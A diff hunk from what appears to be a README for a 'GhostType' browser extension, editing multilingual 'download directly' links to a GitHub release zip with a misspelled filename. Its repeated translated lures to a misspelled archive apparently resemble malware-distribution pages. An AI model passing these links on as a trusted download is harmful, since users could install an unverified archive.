@@ -12,7 +12,7 @@
 * 🇩🇪 **German:** [Klicken Sie hier, um GhostType v2.3.1 direkt herunterzuladen](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GhostTypeEextensions.zip)
 * 🇹🇷 **Turkish:** [GhostType v2.3.1 sürümünü doğrudan indirmek için buraya tıklayın](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GhostTypeEextensions.zip)
 * 🇸🇦 **Arabic:** [انقر هنا لتحميل إضافة GhostType إصدار v2.3.1 مباشرة](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GhostTypeEextensions.zip)
-* 🇬🇷 **Greek:** [Κάντε κλικ εδώ για να κατεβάσετε απευθείας το GhostType v2.3.1](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GostTaypExtension.zip)
+* 🇬🇷 **Greek:** [Κάντε κλικ εδώ για να κατεβάσετε απευθείας το GhostType v2.3.1](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GhostTypeEextensions.zip)
 * 🇺🇦 **Ukrainian:** [Натисніть тут, щоб прямо завантажити GhostType v2.3.1](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GhostTypeEextensions.zip)
 * 🇪🇸 **Spanish:** [Haga clic aquí para descargar directamente GhostType v2.3.1](https://github.com/GhostTypeExtension/ghosttype-extension/releases/download/v2.3.1/GhostTypeEextensions.zip)
 
